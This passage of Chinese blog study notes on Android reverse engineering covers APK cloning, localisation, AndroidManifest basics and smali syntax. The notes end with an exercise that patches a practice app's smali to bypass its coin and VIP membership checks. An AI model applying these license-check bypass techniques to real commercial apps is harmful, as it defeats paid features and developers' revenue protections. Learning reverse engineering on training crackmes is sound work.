<li><p><mark>AndroidManifest.xml是不是我们在AK里面的入口函数?</mark></p>
<p>不是，AndroidManifest更像是一个解释应用基本信息的文件，真正的入口函数是MainActivity.java</p>
</li>
</ol>
<p>我们联系真实的apk文件看看，这个是老师给的文件。</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/1.png" class="" title="This is an image">

<p>可以观察到这个apk文件中，没有asset，lib目录，多了kotlin,okhttp3目录，为什么？？</p>
<ol>
<li><p><mark>为什么没有aaset目录？</mark></p>
<p>所有资源都放到res中了（res与asset混用）</p>
</li>
<li><p><mark>为什么有kotlin目录？</mark></p>
<p>应用使用kotlin开发或者部分功能使用kotlin开发</p>
</li>
<li><p><mark>为什么有okhttp3目录</mark></p>
<p>okhttp3是一个流行的HTTP客户端库</p>
</li>
</ol>
<h4 id="APK双开原理及操作"><a href="#APK双开原理及操作" class="headerlink" title="APK双开原理及操作"></a><a href="#2">APK双开原理及操作</a></h4><p>双开：简单来说，就是手机同时运行两个或多个相同的应用，例如同时运行两个微信</p>
<table>
<thead>
<tr>
<th align="left">原理</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">修改包名</td>
<td align="left">让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP</td>
</tr>
<tr>
<td align="left">修改Framework</td>
<td align="left">对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开</td>
</tr>
<tr>
<td align="left">通过虚拟化技术实现</td>
<td align="left">虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间</td>
</tr>
<tr>
<td align="left">以插件机制运行</td>
<td align="left">利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td>
</tr>
</tbody></table>
<p>本节课老师只着重说了一下第一种双开的方法，但是这里我作为了解都看了一下。第一种就不再说了。</p>
<p><mark><strong>第二种：修改Framework：</strong></mark></p>
<p><strong>首先什么是Framework（框架）?</strong></p>
<ul>
<li><strong>它是一层核心代码</strong>，位于安卓操作系统（Linux内核）和应用软件之间。</li>
<li><strong>作用</strong>：它为所有APP提供了一个统一的、标准的运行环境和API接口。当你的APP想启动一个活动、发送通知、访问传感器、弹出对话框时，它都不是直接和硬件或系统底层打交道，而是调用<strong>Framework</strong>提供的相应功能。</li>
<li><strong>类比</strong>：如果把安卓系统比作一辆汽车，那么：<ul>
<li><strong>Linux内核</strong>是发动机、底盘、变速箱等最底层的机械结构。</li>
<li><strong>Framework</strong>就是方向盘、油门、刹车、仪表盘、中控系统——它为司机（APP）提供了统一、易用的操作界面，隐藏了底层的复杂机械原理。</li>
<li><strong>APP</strong>就是司机，通过操作方向盘和油门来驾驶汽车。</li>
</ul>
</li>
</ul>
<p><strong>一句话总结：Framework是所有Android APP赖以生存的、由系统提供的公共基础服务层。</strong></p>
<p><strong>厂商如何通过修改Framework实现双开？</strong></p>
<p>双开的本质是：让同一个APP的两个副本同时独立运行，且数据互不干扰。</p>
<p>对于手机厂商来说，他们拥有系统的“上帝视角”：</p>
<ol>
<li>Framework负责管理APP的整个生命周期（创建，启动，销毁，暂停）。厂商可以修改这部分。</li>
</ol>
<p>修改Framework就相当于是修改宪法一样，在系统最底层进行修改。</p>
<p><mark><strong>第三种：通过虚拟化技术实现：</strong></mark></p>
<p>虚拟化技术的本质是 <strong>“欺骗”</strong>，让一个APP认为自己运行在一个完整的、独立的Android系统中，而实际上它只是运行在一个受控制的<strong>沙箱环境</strong>里。</p>
<p>实现步骤相当繁琐，这里不再仔细研究了。</p>
<p>那么怎么利用第一种修改包名的方式进行双开文件呢？</p>
<ol>
<li>下载 <strong>MT管理器和NP管理器</strong></li>
<li>打开NP管理器（因为这个功能MT管理器要vip）</li>
<li>点击左上角的图标</li>
</ol>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/2.png" class="" title="This is an image">

<ol start="4">
<li><p>点击我们的apk文件wuaipojie</p>
</li>
<li><p>选择提取安装包，有提示弹出后选择定位</p>
</li>
<li><p>点击apk文件内选择功能</p>
</li>
<li><p>点击apk共存</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/3.png" class="" title="This is an image">
</li>
<li><p>点击确定</p>
</li>
<li><p>之后就可以看到有两个文件了</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/4.png" class="" title="This is an image">
</li>
<li><p>点击新的文件，安装。就可以实现应用双开了</p>
</li>
</ol>
<p>其实不难理解这个操作的原因，因为我们是通过改变apk文件的包名来实现应用双开的，这个操作正好改变了包名从而实现应用的双开。</p>
<h4 id="汉化APK"><a href="#汉化APK" class="headerlink" title="汉化APK"></a><a href="#3">汉化APK</a></h4><p>汉化：使用专门的工具对外文版的软件资源进行读取、翻译、修改、回写等一系列处理，使软件的菜单、对话框、提示等用户界面显示为中文，而程序的内核和功能保持不变，这个过程即为软件汉化</p>
<p>汉化可分三种</p>
<ul>
<li>arsc汉化：resources.arsc文件，通常用于界面文本汉化，菜单项汉化等等</li>
<li>xml汉化：对应各种xml文件，用于汉化硬编码文本，应用名称，权限描述等等</li>
<li>dex汉化：classes.dex文件，适用于代码中的字符串</li>
</ul>
<p><strong>将demo中的文字进行汉化</strong></p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/5.png" class="" title="This is an image">

<p>这个是我们需要汉化的界面，主要流程是：</p>
<ol>
<li>打开MT管理器</li>
<li>全局搜索字符串</li>
<li>保存安装</li>
</ol>
<p>用图片演示下</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/6.png" class="" title="This is an image">

<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/7.png" class="" title="This is an image">

<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/8.png" class="" title="This is an image">

<ul>
<li>反编译：将xml文件转化成人类可读的xml格式</li>
<li>字符常量池：只提取xml文件的字符串资源</li>
</ul>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/9.png" class="" title="This is an image">

<p>将英文改成中文即可，改完之后，点击上面保存标志</p>
<p>之后重新安装，但是安装时会提示安装失败，这是因为签名不一致，我们汉化之后使用的是MT管理器的签名，把之前下载的软件卸载了，再安装就可以了。</p>
<p>改好之后，我们就要改下面这个俄文的，因为不能直接在页面上复制，可以使用开发者助手。</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/10.png" class="" title="This is an image">

<p>开始之后，点击我们要复制的文本，会弹出控件属性，点击Text就可以复制了。</p>
<p>和原来一样，还是去搜索这个字符串。</p>
<p>点击文件之后，选择翻译模式，点击DEFAULT，找到并输入中文之后这部分就汉化完成了。</p>
<p>第三部分是一段英文，依旧使用开发者助手进行复制，我们在MT管理器中搜索这段英文</p>
<p>搜索之后，发现这个字符串在classes.dex中，我们点击该文件，选择Dex编辑器++</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/11.png" class="" title="This is an image">

<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/12.png" class="" title="This is an image">

<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/13.png" class="" title="This is an image">

<p>修改完之后，点击上方保存。重新安装</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/14.png" class="" title="This is an image">

<p>可以看到已经汉化好了</p>
<h4 id="初识AndroidManifest-xml"><a href="#初识AndroidManifest-xml" class="headerlink" title="初识AndroidManifest.xml"></a><a href="#4">初识AndroidManifest.xml</a></h4><p>AndroidManifest.xml文件是整个应用程序的信息描述文件，定义了应用程序中包含的Activity,Service,Content provider和BroadcastReceiver组件信息。每个应用程序在根目录下必须包含一个AndroidManifest.xml文件，且文件名不能修改。它描述了package中暴露的组件，他们各自的实现类，各种能被处理的数据和启动位置。</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">定义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">versionCode</td>
<td align="left">版本号，主要用来更新，例如:12</td>
</tr>
<tr>
<td align="left">versionName</td>
<td align="left">版本名，给用户看的，例如:1.2</td>
</tr>
<tr>
<td align="left">package</td>
<td align="left">包名，例如：com.zj.52pj.demo</td>
</tr>
<tr>
<td align="left">uses-permission android:name&#x3D;””</td>
<td align="left">应用权限，例如：android.permission.INTERNET 代表网络权限</td>
</tr>
<tr>
<td align="left">android:label&#x3D;”@string&#x2F;app_name”</td>
<td align="left">应用名称</td>
</tr>
<tr>
<td align="left">android:icon&#x3D;”@mipmap&#x2F;ic_launcher”</td>
<td align="left">应用图标路径</td>
</tr>
<tr>
<td align="left">android:debuggable&#x3D;”true”</td>
<td align="left">应用是否开启debug权限</td>
</tr>
</tbody></table>
<h4 id="更改图标与文件名"><a href="#更改图标与文件名" class="headerlink" title="更改图标与文件名"></a><a href="#5">更改图标与文件名</a></h4><p>这个功能在NP管理器中有（MT需要vip）</p>
<p>我们点击需要修改的APK文件，点击功能，点击通用编辑，修改名字与图标即可</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/15.png" class="" title="This is an image">

<p>成功了。</p>
<h4 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a><a href="#5">课后作业</a></h4><blockquote>
<p>更改图片</p>
</blockquote>
<p>首先我们需要下载<code>界面分析</code>这个软件。</p>
<p>通过网盘分享的文件：xiaoluo.spy.apk<br>链接: <a href="https://pan.baidu.com/s/1pJXZ7cdEXs1tPdi6_aCVXQ">https://pan.baidu.com/s/1pJXZ7cdEXs1tPdi6_aCVXQ</a> 提取码: 1mp6</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/16.png" class="" title="This is an image">

<p>下载这个软件的原因是：它可以识别出图片的id，通过id我们可以找到图片的位置及名称</p>
<p>这里我已经替换过了，我就用替换过的图片写了，过程都是一样的。</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/17.png" class="" title="This is an image">

<p>点击我们需要查的控件（图片），将 <strong>idHex</strong>复制下来，这里查到的是<code>0x7f0800d3</code></p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/18.png" class="" title="This is an image">

<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/19.png" class="" title="This is an image">

<p>搜索到Jf.xml文件中有这个id，点击这个文件，点击反编译</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/20.png" class="" title="This is an image">

<p>我们刚刚搜索的<code>0x7f0800d3</code>是控件Id，控件id只是标识UI控件，而我们要替换的是资源，所以我们这里真正的目的是为了找到资源Id<code>7F0D000B</code></p>
<p>我们去<code>resources.arsc</code>中搜索该资源id，那么为什么要在resources.arsc中搜索呢？？</p>
<ul>
<li>resources.arsc是APK的资源索引表</li>
<li>包含了所有资源Id与资源名称与路径映射关系</li>
</ul>
<p>使用Arsc编辑器打开该文件，选择ID定位资源</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/21.png" class="" title="This is an image">

<p>这里面就显示了图片的路径及名称</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/22.png" class="" title="This is an image">

<p>找到之后，我们要替换的图片肯定是在共享文件中的，共享文件的路径是<code>/storage/emulated/o/Pictures</code></p>
<p>需要注意的是，共享文件夹中的图片命名必须和替换的图片名一致</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/23.png" class="" title="This is an image">

<p>长按共享文件中的图片</p>
<img src="/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/24.png" class="" title="This is an image">

<p>替换好之后，安装就可以了。</p>
]]></content>
      <tags>
        <tag>安卓逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android逆向学习笔记(六)</title>
    <url>/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/</url>
    <content><![CDATA[<h2 id="Android逆向学习笔记-六"><a href="#Android逆向学习笔记-六" class="headerlink" title="Android逆向学习笔记(六)"></a>Android逆向学习笔记(六)</h2><p><a href="https://www.52pojie.cn/thread-1701353-1-1.html">《安卓逆向这档事》三、初识smali，vip终结者</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#1">smali及其语法</a></li>
<li><a href="#2">寄存器</a></li>
<li><a href="#3">demo3作业</a></li>
</ul>
<hr>
<h3 id="smali及其语法"><a href="#smali及其语法" class="headerlink" title="smali及其语法"></a><a href="#1">smali及其语法</a></h3><p><mark><strong>数据类型</strong></mark></p>
<table>
<thead>
<tr>
<th align="left">Java类型</th>
<th align="left">Smali表示</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">byte</td>
<td align="left">B</td>
<td align="left">字节型</td>
</tr>
<tr>
<td align="left">char</td>
<td align="left">C</td>
<td align="left">字符型</td>
</tr>
<tr>
<td align="left">short</td>
<td align="left">S</td>
<td align="left">短整型</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">I</td>
<td align="left">整型</td>
</tr>
<tr>
<td align="left">long</td>
<td align="left">J</td>
<td align="left">长整型</td>
</tr>
<tr>
<td align="left">float</td>
<td align="left">F</td>
<td align="left">单精度浮点</td>
</tr>
<tr>
<td align="left">double</td>
<td align="left">D</td>
<td align="left">双精度浮点</td>
</tr>
<tr>
<td align="left">boolean</td>
<td align="left">Z</td>
<td align="left">布尔型</td>
</tr>
<tr>
<td align="left">void</td>
<td align="left">V</td>
<td align="left">无返回值</td>
</tr>
</tbody></table>
<p><mark><strong>常量</strong></mark></p>
<table>
<thead>
<tr>
<th>const&#x2F;4 v0,0x1</th>
<th>4位常量：v0&#x3D;1</th>
</tr>
</thead>
<tbody><tr>
<td>const&#x2F;16 v0,0x100</td>
<td>16位常量：v0&#x3D;256</td>
</tr>
<tr>
<td>const v0, 0x12345678</td>
<td>32位常量</td>
</tr>
<tr>
<td>const-wide&#x2F;16 v0, 0x100</td>
<td>宽(64位)常量</td>
</tr>
<tr>
<td>const-string v0, “hello”</td>
<td>字符串常量</td>
</tr>
<tr>
<td>const-class v0, Ljava&#x2F;lang&#x2F;String;</td>
<td>类常量</td>
</tr>
</tbody></table>
<p><mark><strong>算数运算指令</strong></mark></p>
<table>
<thead>
<tr>
<th>add-int v0, v1, v2</th>
<th>v0 &#x3D; v1 + v2 (int)</th>
</tr>
</thead>
<tbody><tr>
<td>sub-int v0, v1, v2</td>
<td>v0 &#x3D; v1 - v2</td>
</tr>
<tr>
<td>mul-int v0, v1, v2</td>
<td>v0 &#x3D; v1 * v2</td>
</tr>
<tr>
<td>div-int v0, v1, v2</td>
<td>v0 &#x3D; v1 &#x2F; v2</td>
</tr>
<tr>
<td>rem-int v0, v1, v2</td>
<td>v0 &#x3D; v1 % v2</td>
</tr>
</tbody></table>
<p><mark><strong>条件控制指令</strong></mark></p>
<table>
<thead>
<tr>
<th>if-eq</th>
<th>全称equal(a&#x3D;b)，比较寄存器ab内容，相同则跳</th>
</tr>
</thead>
<tbody><tr>
<td>if-ne</td>
<td>全称not equal(a!&#x3D;b)，ab内容不相同则跳</td>
</tr>
<tr>
<td>if-eqz</td>
<td>全称equal zero(a&#x3D;0)，z即是0的标记，a等于0则跳</td>
</tr>
<tr>
<td>if-nez</td>
<td>全称not equal zero(a!&#x3D;0)，a不等于0则跳</td>
</tr>
<tr>
<td>if-ge</td>
<td>全称greater equal(a&gt;&#x3D;b)，a大于或等于则跳</td>
</tr>
<tr>
<td>if-le</td>
<td>全称little equal(a&lt;&#x3D;b)，a小于或等于则跳</td>
</tr>
<tr>
<td>goto</td>
<td>强制跳到指定位置</td>
</tr>
<tr>
<td>switch</td>
<td>分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td>
</tr>
<tr>
<td>iget</td>
<td>获取寄存器数据</td>
</tr>
</tbody></table>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a><a href="#2">寄存器</a></h3><p>在smali里的所有操作都必须经过寄存器来进行：</p>
<p><strong>本地寄存器</strong> 用<code>v</code>开头数字结尾的符号来表示，如v0、 v1、v2。 </p>
<p><strong>参数寄存器</strong> 则使用<code>p</code>开头数字结尾的符号来表示，如p0、p1、p2。</p>
<p>特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个 参数，p2代表函数中的第二个参数。而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法）</p>
<h3 id="demo3作业"><a href="#demo3作业" class="headerlink" title="demo3作业"></a><a href="#3">demo3作业</a></h3><p>首先下载核心破解，下载好之后会有弹窗显示权限问题，点击弹窗</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/1.png" class="This is an image">

<p>下载好这个软件之后，即使我们的签名不一致也可以重新安装。</p>
<p>打开这个demo看看关键词是什么</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/2.png" class="This is an image">

<p>可以看到是<code>请先充值大会员</code></p>
<p><strong>在开始破解之前，我们需要知道代码的逻辑是什么</strong></p>
<p>将apk文件拖入jadx中查看java源与smali代码</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/3.png" class="This is an image">

<p>逻辑很简单：</p>
<ol>
<li>当金币数量小于10时，提醒先获得10个硬币</li>
<li>当不是会员时提醒先充值会员</li>
</ol>
<p>（smali码太长不再展示，由于jadx无法加注释，看unicode码很难受，我就使用了Androidkiller来进行反编译，这样得到的unicode可以看见中文，比较方便）</p>
<p>破解逻辑：</p>
<ol>
<li>修改跳转条件，使得能执行会员逻辑</li>
<li>使用goto直接跳转</li>
<li>修改寄存器内的值</li>
</ol>
<blockquote>
<p><strong>修改跳转条件</strong></p>
</blockquote>
<p>用MT管理器打开demo后，定位到我们要改的地方（可以直接搜索：大会员）</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"> <span class="built_in"> const/4 </span>p5, 0x1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/16 </span>v0, 0xa</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> if-ge </span>p0, v0,<span class="keyword"> :cond_15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 34</span><br><span class="line">   <span class="built_in"> move-object </span>p0, p1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>p0, <span class="class">Landroid/content/Context;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">&quot;请先获取10个硬币哦&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>v0, <span class="class">Ljava/lang/CharSequence;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;p0, v0, p5&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;makeText(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/CharSequence;</span>I)<span class="class">Landroid/widget/Toast;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>p0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;show()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 36</span><br><span class="line">   <span class="keyword"> :cond_15</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p1&#125;, <span class="class">Lcom/zj/wuaipojie/ui/ChallengeSecond;</span>-&gt;isvip()Z</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result </span>p0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> if-eqz </span>p0,<span class="keyword"> :cond_43</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 37</span><br><span class="line">   <span class="built_in"> check-cast </span>p1, <span class="class">Landroid/content/Context;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>p0, <span class="string">&quot;当前已经是大会员了哦！&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>p0, <span class="class">Ljava/lang/CharSequence;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;p1, p0, p5&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;makeText(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/CharSequence;</span>I)<span class="class">Landroid/widget/Toast;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>p0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;show()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const </span>p0, 0x7f0d0018</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 38</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p2, p0&#125;, <span class="class">Landroid/widget/ImageView;</span>-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const </span>p0, 0x7f0d0008</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 39</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p3, p0&#125;, <span class="class">Landroid/widget/ImageView;</span>-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const </span>p0, 0x7f0d000a</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 40</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p4, p0&#125;, <span class="class">Landroid/widget/ImageView;</span>-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 41</span><br><span class="line">   <span class="built_in"> sget-object </span>p0, <span class="class">Lcom/zj/wuaipojie/util/SPUtils;</span>-&gt;INSTANCE:<span class="class">Lcom/zj/wuaipojie/util/SPUtils;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/4 </span>p2, 0x2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>p3, <span class="string">&quot;level&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, p1, p3, p2&#125;, <span class="class">Lcom/zj/wuaipojie/util/SPUtils;</span>-&gt;saveInt(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/String;</span>I)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_50</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 44</span><br><span class="line">   <span class="keyword"> :cond_43</span></span><br><span class="line">   <span class="built_in"> check-cast </span>p1, <span class="class">Landroid/content/Context;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>p0, <span class="string">&quot;请先充值大会员哦！&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>p0, <span class="class">Ljava/lang/CharSequence;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;p1, p0, p5&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;makeText(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/CharSequence;</span>I)<span class="class">Landroid/widget/Toast;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>p0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;show()V</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :goto_50</span></span><br><span class="line">   <span class="built_in"> return </span>p5<span class="keyword"></span></span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>

<p>代码如上</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/4.png" class="This is an image">

<p>这一段就是先判断金币够不够10，如果够10的话，跳转到<code>cond_15</code>（下一个if语句），那么要想改变这个逻辑，使得如果不够也要跳转，就将<code>if-ge</code> 改成<code>if-le</code>。</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/5.png" class="This is an image">

<p>这段就是判断p0是否等于0，如果等于0的话跳转到<code>cond_43</code>（请充值会员这里），如果想直接往下运行，不进行跳转，可以直接将这个跳转语句注释掉（往前加<code>#</code>即可）。</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/6.png" class="This is an image">

<blockquote>
<p><strong>使用goto直接跳转</strong></p>
</blockquote>
<p>我们可以直接跳过中间的if判断，直接进行goto跳转</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/7.png" class="This is an image">

<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/8.png" class="This is an image">

<p>加完goto之后，直接改变了我们的控制流</p>
<p>改完之后，保存，成功！</p>
<blockquote>
<p>修改寄存器的值</p>
</blockquote>
<p>到这里其实根据<code>修改寄存器的值</code>也能明显知道怎么修改，我们会跳转就是因为不满足条件，那我们直接将寄存器改了让它满足条件不就好了？</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/4.png" class="This is an image">

<p>首先是这里，我想让它跳转到cond_15，但是必须满足p0&gt;&#x3D;v0才可以，这里的v0&#x3D;10，那直接将v0改成0，不管p0等于多少都是大于等于的。</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/9.png" class="This is an image">

<p>代码向下执行时，会进入isvip()这个函数，将返回值赋给p0，这里的<code>move-result</code>：</p>
<p>当你调用一个方法后（使用 <code>invoke-*</code> 指令），该方法的返回值会存储在一个特殊的寄存器中，你需要使用 <code>move-result</code> 或 <code>move-result-wide</code> 将其移动到指定的寄存器中才能使用。</p>
<p>再往下看，如果po&#x3D;0就跳转到cond_43，这里同样不能跳转，那就要修改isvip()的返回值，我们跟进isvip()这个函数。</p>
<img src="/2026/02/06/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/10.png" class="This is an image">

<p>这里的返回值是v0，我们将v0改成1就可以了。保存，成功！</p>
<p>流程可以简单总结一下：</p>
<ol>
<li>根据关键词查到相关函数。</li>
<li>修改函数逻辑（改变执行流或者改变寄存器值）</li>
</ol>
]]></content>
      <tags>
        <tag>安卓逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android逆向学习笔记(七)</title>
    <url>/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/</url>
    <content><![CDATA[<h2 id="Android逆向学习笔记-七"><a href="#Android逆向学习笔记-七" class="headerlink" title="Android逆向学习笔记(七)"></a>Android逆向学习笔记(七)</h2><p><a href="https://www.52pojie.cn/thread-1706691-1-1.html">《安卓逆向这档事》四、恭喜你获得广告&amp;弹窗静默</a></p>
<span id="more"></span>

